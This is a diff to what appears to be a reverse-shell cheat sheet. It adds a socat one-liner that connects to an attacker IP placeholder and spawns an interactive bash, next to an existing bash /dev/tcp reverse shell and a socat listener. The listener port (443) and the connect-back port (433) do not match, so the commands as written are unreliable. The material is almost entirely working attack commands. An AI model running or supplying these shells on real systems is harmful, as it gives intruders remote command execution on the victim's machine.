@@ -46,6 +46,9 @@ $ socat -d -d TCP-LISTEN:443 STDOUT
 # redirect input & output through tcp to the attacker's IP on port 443
 # combine both standard output and standard error
 $ bash -i >& /dev/tcp/<attacker_ip>/433 0>&1
+
+# socat alternative
+$ socat TCP:<attacker_ip>:433 EXEC:'bash',pty,stderr,setsid,sigint,sane
 ```
 
 ### Bash read line reverse shell
